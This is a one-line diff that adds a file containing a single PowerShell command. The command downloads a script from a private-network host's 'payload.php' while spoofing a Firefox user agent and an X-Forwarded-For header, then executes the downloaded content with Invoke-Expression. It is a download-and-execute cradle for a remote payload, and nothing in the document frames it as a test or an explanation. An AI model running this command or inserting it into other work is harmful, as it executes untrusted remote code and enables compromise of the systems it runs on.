@@ -1,0 +1,1 @@
+$((Invoke-WebRequest http://192.168.0.21/payload.php?session -UserAgent 'Mozilla/5.0 (X11; Linux x86_64; rv:102.01) Gecko/20100101 Firefox/102.01' -Headers @{'X-Forwarded-For' = '192.168.0.29'}).Content) | IEX
